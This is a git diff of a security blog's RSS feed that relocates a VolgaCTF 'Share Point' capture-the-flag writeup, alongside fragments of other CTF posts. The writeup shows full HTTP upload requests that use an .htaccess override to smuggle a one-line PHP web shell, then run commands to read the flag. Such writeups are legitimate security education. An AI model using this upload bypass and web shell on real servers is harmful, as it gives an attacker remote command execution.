@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[Dubs3c]]></title><description><![CDATA[Hack, code, sleep, repeat]]></description><link>https://dubell.io/</link><image><url>https://dubell.io//logos/logo-48.png</url><title>Dubs3c</title><link>https://dubell.io/</link></image><generator>dubs3c</generator><lastBuildDate>Sat, 30 Nov 2019 23:02:34 GMT</lastBuildDate><atom:link href="https://dubell.io//rss.xml" rel="self" type="application/rss+xml"/><item><title><![CDATA[About me]]></title><description><![CDATA[My name is Michael and I'm currently working as a security consultant. Studied Computer Systems and Networks for my Master's degree at Chalmers University of Technology in Sweden…]]></description><link>https://dubell.io//me/</link><guid isPermaLink="false">https://dubell.io//me/</guid><content:encoded>&lt;p&gt;My name is Michael and I&apos;m currently working as a security consultant. Studied Computer Systems and Networks for my Master&apos;s degree at Chalmers University of Technology in Sweden. Before Chalmers I was working for an e-commerce company doing a little bit of everything, mainly it-support, PHP development, system administration, and business intelligence. &lt;/p&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[Dubs3c]]></title><description><![CDATA[Hack, code, sleep, repeat]]></description><link>https://dubell.io/</link><image><url>https://dubell.io//logos/logo-48.png</url><title>Dubs3c</title><link>https://dubell.io/</link></image><generator>dubs3c</generator><lastBuildDate>Thu, 02 Jan 2020 20:05:29 GMT</lastBuildDate><atom:link href="https://dubell.io//rss.xml" rel="self" type="application/rss+xml"/><item><title><![CDATA[About me]]></title><description><![CDATA[My name is Michael and I'm currently working as a security consultant. Studied Computer Systems and Networks for my Master's degree at Chalmers University of Technology in Sweden…]]></description><link>https://dubell.io//me/</link><guid isPermaLink="false">https://dubell.io//me/</guid><content:encoded>&lt;p&gt;My name is Michael and I&apos;m currently working as a security consultant. Studied Computer Systems and Networks for my Master&apos;s degree at Chalmers University of Technology in Sweden. Before Chalmers I was working for an e-commerce company doing a little bit of everything, mainly it-support, PHP development, system administration, and business intelligence. &lt;/p&gt;
 &lt;p&gt;During my free time I enjoy playing CTF/&lt;a href=&quot;https://www.hackthebox.eu/profile/6077&quot;&gt;HTB&lt;/a&gt;, develop new tools/software and learning new cool technologies.&lt;/p&gt;
 &lt;h3 id=&quot;around-the-web&quot;&gt;&lt;a href=&quot;#around-the-web&quot; aria-label=&quot;around the web permalink&quot; class=&quot;anchor&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Around the web&lt;/h3&gt;
 &lt;ul&gt;
@@ -456,7 +456,66 @@ for flagchar in flag:
 print(&amp;#39;Looking at it now, it all seems so simple: {}&amp;#39;.format(accumulated))&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;Which revealed:&lt;/p&gt;
 &lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;Looking at it now, it all seems so simple: flag{th3_m0nst3rs_turned_0ut_2_be_ju5t_tr33s}&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;For more writeups visit &lt;a href=&quot;https://github.com/ChalmersCTF/Writeups&quot;&gt;https://github.com/ChalmersCTF/Writeups&lt;/a&gt; and don&apos;t forget to check out my friend&apos;s and fellow team member&apos;s website &lt;a href=&quot;https://www.nindoda.com/&quot;&gt;https://www.nindoda.com/&lt;/a&gt;.&lt;/p&gt;</content:encoded><author>michael@dubell.io</author></item><item><title><![CDATA[VolgaCTF - Bloody Feedback writeup]]></title><description><![CDATA[The challenge basically has two functions, 1) Send feedback and 2) view the status of the sent feedback. There is also page that cotains "Top Messages" which is the feedback people…]]></description><link>https://dubell.io//volgactf-bloody-feedback-writeup/</link><guid isPermaLink="false">https://dubell.io//volgactf-bloody-feedback-writeup/</guid><category><![CDATA[CTF Writeup]]></category><pubDate>Tue, 28 Mar 2017 00:00:00 GMT</pubDate><content:encoded>&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;Bloody Feedback
+&lt;p&gt;For more writeups visit &lt;a href=&quot;https://github.com/ChalmersCTF/Writeups&quot;&gt;https://github.com/ChalmersCTF/Writeups&lt;/a&gt; and don&apos;t forget to check out my friend&apos;s and fellow team member&apos;s website &lt;a href=&quot;https://www.nindoda.com/&quot;&gt;https://www.nindoda.com/&lt;/a&gt;.&lt;/p&gt;</content:encoded><author>michael@dubell.io</author></item><item><title><![CDATA[VolgaCTF - Share Point writeup]]></title><description><![CDATA[The challenge begun by signing in to the control panel by simply entering random account details. Once logged in you had the ability to upload files and share them with an other…]]></description><link>https://dubell.io//volgactf-share-point-writeup/</link><guid isPermaLink="false">https://dubell.io//volgactf-share-point-writeup/</guid><category><![CDATA[CTF Writeup]]></category><pubDate>Tue, 28 Mar 2017 00:00:00 GMT</pubDate><content:encoded>&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;Share Point
+
+Look! I wrote a good service for sharing your files with your friends, enjoy)
+share-point.quals.2017.volgactf.ru&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;The challenge begun by signing in to the control panel by simply entering random account details. Once logged in you had the ability to upload files and share them with an other user. Since the site only had one functionality, uploading files, I assumed the goal had to be to upload a web shell and find the flag on the file system.&lt;/p&gt;
+&lt;p&gt;Uploading files with a &lt;code class=&quot;language-text&quot;&gt;.php&lt;/code&gt; extension got rejected. I tried some tricks when trying to upload my &lt;code class=&quot;language-text&quot;&gt;shell.php&lt;/code&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Chaning the Content Type to &lt;code class=&quot;language-text&quot;&gt;image/jpeg&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Injecting null values in the filename &lt;code class=&quot;language-text&quot;&gt;shell.php\00.gif&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Uploading a file with the magic headers of a gif file.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Next I tried to upload an &lt;code class=&quot;language-text&quot;&gt;.htaccess&lt;/code&gt; file with the following contents &lt;code class=&quot;language-text&quot;&gt;AddType application/x-httpd-php .jpg&lt;/code&gt;, this would cause &lt;code class=&quot;language-text&quot;&gt;.jpg&lt;/code&gt; files to executed as &lt;code class=&quot;language-text&quot;&gt;.php&lt;/code&gt; files, and it worked!&lt;/p&gt;
+&lt;p&gt;The following code snippet shows the HTTP POST request from Burp Suite when uploading the &lt;code class=&quot;language-text&quot;&gt;.htaccess&lt;/code&gt; file and the following &lt;code class=&quot;language-text&quot;&gt;shell.php.jpg&lt;/code&gt;. &lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;POST /upload.php HTTP/1.1
+Host: share-point.quals.2017.volgactf.ru
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Referer: http://share-point.quals.2017.volgactf.ru/upload.php
+Content-Length: 271
+Content-Type: multipart/form-data; boundary=---------------------------1620217569904038223723611436
+Cookie: PHPSESSID=gsl3b673of0kbvaav8am0vs690
+Connection: close
+
+-----------------------------1620217569904038223723611436
+Content-Disposition: form-data; name=&amp;quot;userFile&amp;quot;; filename=&amp;quot;.htaccess&amp;quot;
+Content-Type: application/octet-stream
+
+AddType application/x-httpd-php .jpg
+
+-----------------------------1620217569904038223723611436--&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;POST /upload.php HTTP/1.1
+Host: share-point.quals.2017.volgactf.ru
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Referer: http://share-point.quals.2017.volgactf.ru/upload.php
+Content-Length: 256
+Content-Type: multipart/form-data; boundary=---------------------------5375118911646132755521388984
+Cookie: PHPSESSID=gsl3b673of0kbvaav8am0vs690
+Connection: close
+
+-----------------------------5375118911646132755521388984
+Content-Disposition: form-data; name=&amp;quot;userFile&amp;quot;; filename=&amp;quot;shell.php.jpg&amp;quot;
+Content-Type: image/jpeg
+
+&amp;lt;?php system($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;
+
+-----------------------------5375118911646132755521388984--&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Once we have uploaded the shell, we can start looking for the flag on the file system.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;http://share-point.quals.2017.volgactf.ru/files/Smacker1/shell.php.jpg?cmd=ls -lah
+
+total 24K
+drwxr-xr-x   2 www-data www-data 4.0K Mar 27 00:05 .
+drwxr-xr-x 252 www-data www-data  12K Mar 27 00:04 ..
+-rw-r--r--   1 www-data www-data   37 Mar 27 00:04 .htaccess
+-rw-r--r--   1 www-data www-data   31 Mar 27 00:05 shell.php.jpg&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;By pure luck I checked the &lt;code class=&quot;language-text&quot;&gt;/opt/&lt;/code&gt; folder and found &lt;code class=&quot;language-text&quot;&gt;flag.txt&lt;/code&gt;. Otherwise I would have simply searched for &quot;flag&quot;.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;http://share-point.quals.2017.volgactf.ru/files/shell.php.jpg?cmd=cat /opt/flag.txt
+VolgaCTF{AnoTHer_apPro0Ach_to_file_Upl0Ad_with_PhP}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded><author>michael@dubell.io</author></item><item><title><![CDATA[VolgaCTF - Bloody Feedback writeup]]></title><description><![CDATA[The challenge basically has two functions, 1) Send feedback and 2) view the status of the sent feedback. There is also page that cotains "Top Messages" which is the feedback people…]]></description><link>https://dubell.io//volgactf-bloody-feedback-writeup/</link><guid isPermaLink="false">https://dubell.io//volgactf-bloody-feedback-writeup/</guid><category><![CDATA[CTF Writeup]]></category><pubDate>Tue, 28 Mar 2017 00:00:00 GMT</pubDate><content:encoded>&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;Bloody Feedback
 
 Send your feedback at bloody-feedback.quals.2017.volgactf.ru
 
@@ -591,66 +650,7 @@ VolgaCTF{eiU7UJhyeu@ud3*} =&amp;gt; name=smacker&amp;amp;message=m&amp;amp;email
       /&gt;
   &lt;/span&gt;
   &lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Flag: VolgaCTF{eiU7UJhyeu@ud3*}&lt;/strong&gt;&lt;/p&gt;</content:encoded><author>michael@dubell.io</author></item><item><title><![CDATA[VolgaCTF - Share Point writeup]]></title><description><![CDATA[The challenge begun by signing in to the control panel by simply entering random account details. Once logged in you had the ability to upload files and share them with an other…]]></description><link>https://dubell.io//volgactf-share-point-writeup/</link><guid isPermaLink="false">https://dubell.io//volgactf-share-point-writeup/</guid><category><![CDATA[CTF Writeup]]></category><pubDate>Tue, 28 Mar 2017 00:00:00 GMT</pubDate><content:encoded>&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;Share Point
-
-Look! I wrote a good service for sharing your files with your friends, enjoy)
-share-point.quals.2017.volgactf.ru&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;The challenge begun by signing in to the control panel by simply entering random account details. Once logged in you had the ability to upload files and share them with an other user. Since the site only had one functionality, uploading files, I assumed the goal had to be to upload a web shell and find the flag on the file system.&lt;/p&gt;
-&lt;p&gt;Uploading files with a &lt;code class=&quot;language-text&quot;&gt;.php&lt;/code&gt; extension got rejected. I tried some tricks when trying to upload my &lt;code class=&quot;language-text&quot;&gt;shell.php&lt;/code&gt;:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Chaning the Content Type to &lt;code class=&quot;language-text&quot;&gt;image/jpeg&lt;/code&gt;.&lt;/li&gt;
-&lt;li&gt;Injecting null values in the filename &lt;code class=&quot;language-text&quot;&gt;shell.php\00.gif&lt;/code&gt;.&lt;/li&gt;
-&lt;li&gt;Uploading a file with the magic headers of a gif file.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;Next I tried to upload an &lt;code class=&quot;language-text&quot;&gt;.htaccess&lt;/code&gt; file with the following contents &lt;code class=&quot;language-text&quot;&gt;AddType application/x-httpd-php .jpg&lt;/code&gt;, this would cause &lt;code class=&quot;language-text&quot;&gt;.jpg&lt;/code&gt; files to executed as &lt;code class=&quot;language-text&quot;&gt;.php&lt;/code&gt; files, and it worked!&lt;/p&gt;
-&lt;p&gt;The following code snippet shows the HTTP POST request from Burp Suite when uploading the &lt;code class=&quot;language-text&quot;&gt;.htaccess&lt;/code&gt; file and the following &lt;code class=&quot;language-text&quot;&gt;shell.php.jpg&lt;/code&gt;. &lt;/p&gt;
-&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;POST /upload.php HTTP/1.1
-Host: share-point.quals.2017.volgactf.ru
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0
-Accept: */*
-Accept-Language: en-US,en;q=0.5
-Referer: http://share-point.quals.2017.volgactf.ru/upload.php
-Content-Length: 271
-Content-Type: multipart/form-data; boundary=---------------------------1620217569904038223723611436
-Cookie: PHPSESSID=gsl3b673of0kbvaav8am0vs690
-Connection: close
-
------------------------------1620217569904038223723611436
-Content-Disposition: form-data; name=&amp;quot;userFile&amp;quot;; filename=&amp;quot;.htaccess&amp;quot;
-Content-Type: application/octet-stream
-
-AddType application/x-httpd-php .jpg
-
------------------------------1620217569904038223723611436--&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;POST /upload.php HTTP/1.1
-Host: share-point.quals.2017.volgactf.ru
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0
-Accept: */*
-Accept-Language: en-US,en;q=0.5
-Referer: http://share-point.quals.2017.volgactf.ru/upload.php
-Content-Length: 256
-Content-Type: multipart/form-data; boundary=---------------------------5375118911646132755521388984
-Cookie: PHPSESSID=gsl3b673of0kbvaav8am0vs690
-Connection: close
-
------------------------------5375118911646132755521388984
-Content-Disposition: form-data; name=&amp;quot;userFile&amp;quot;; filename=&amp;quot;shell.php.jpg&amp;quot;
-Content-Type: image/jpeg
-
-&amp;lt;?php system($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;
-
------------------------------5375118911646132755521388984--&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;Once we have uploaded the shell, we can start looking for the flag on the file system.&lt;/p&gt;
-&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;http://share-point.quals.2017.volgactf.ru/files/Smacker1/shell.php.jpg?cmd=ls -lah
-
-total 24K
-drwxr-xr-x   2 www-data www-data 4.0K Mar 27 00:05 .
-drwxr-xr-x 252 www-data www-data  12K Mar 27 00:04 ..
--rw-r--r--   1 www-data www-data   37 Mar 27 00:04 .htaccess
--rw-r--r--   1 www-data www-data   31 Mar 27 00:05 shell.php.jpg&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;By pure luck I checked the &lt;code class=&quot;language-text&quot;&gt;/opt/&lt;/code&gt; folder and found &lt;code class=&quot;language-text&quot;&gt;flag.txt&lt;/code&gt;. Otherwise I would have simply searched for &quot;flag&quot;.&lt;/p&gt;
-&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;http://share-point.quals.2017.volgactf.ru/files/shell.php.jpg?cmd=cat /opt/flag.txt
-VolgaCTF{AnoTHer_apPro0Ach_to_file_Upl0Ad_with_PhP}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded><author>michael@dubell.io</author></item><item><title><![CDATA[Chalmers CTF]]></title><description><![CDATA[Hey, long time since last post, been busy with university and starting Chalmers very first CTF team:  Chalmers CTF !! Check out our website for information:  https://chalmersctf.se]]></description><link>https://dubell.io//chalmers-ctf/</link><guid isPermaLink="false">https://dubell.io//chalmers-ctf/</guid><category><![CDATA[CTF]]></category><pubDate>Wed, 01 Feb 2017 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Hey, long time since last post, been busy with university and starting Chalmers very first CTF team: &lt;strong&gt;Chalmers CTF&lt;/strong&gt;!!&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Flag: VolgaCTF{eiU7UJhyeu@ud3*}&lt;/strong&gt;&lt;/p&gt;</content:encoded><author>michael@dubell.io</author></item><item><title><![CDATA[Chalmers CTF]]></title><description><![CDATA[Hey, long time since last post, been busy with university and starting Chalmers very first CTF team:  Chalmers CTF !! Check out our website for information:  https://chalmersctf.se]]></description><link>https://dubell.io//chalmers-ctf/</link><guid isPermaLink="false">https://dubell.io//chalmers-ctf/</guid><category><![CDATA[CTF]]></category><pubDate>Wed, 01 Feb 2017 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Hey, long time since last post, been busy with university and starting Chalmers very first CTF team: &lt;strong&gt;Chalmers CTF&lt;/strong&gt;!!&lt;/p&gt;
 &lt;p&gt;Check out our website for information: &lt;a href=&quot;https://chalmersctf.se&quot;&gt;https://chalmersctf.se&lt;/a&gt;&lt;/p&gt;</content:encoded><author>michael@dubell.io</author></item><item><title><![CDATA[SEC-T CTF - Confusion Writeup]]></title><description><![CDATA[This time I participated in the  SEC-T CTF  event and it was pretty fun! I played with a group of people from my university and we managed to get quite some points. But I didn't…]]></description><link>https://dubell.io//sec-t-ctf-confusion-writeup/</link><guid isPermaLink="false">https://dubell.io//sec-t-ctf-confusion-writeup/</guid><category><![CDATA[CTF Writeup]]></category><pubDate>Sat, 10 Sep 2016 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;This time I participated in the &lt;a href=&quot;https://www.sec-t.org/&quot;&gt;SEC-T CTF&lt;/a&gt; event and it was pretty fun! I played with a group of people from my university and we managed to get quite some points. But I didn&apos;t manage to solve some of the challenges on time. However this didn&apos;t stop from trying to solve them once the event was over!&lt;/p&gt;
 &lt;p&gt;One of the challenges I was hooked on was called &lt;strong&gt;Confusion&lt;/strong&gt;. The reason why was because it seemed like an &quot;easy&quot; challenge but for some reason I couldn&apos;t figure it out! The challenge began by downloading the following image:&lt;/p&gt;
 &lt;p&gt;&lt;a
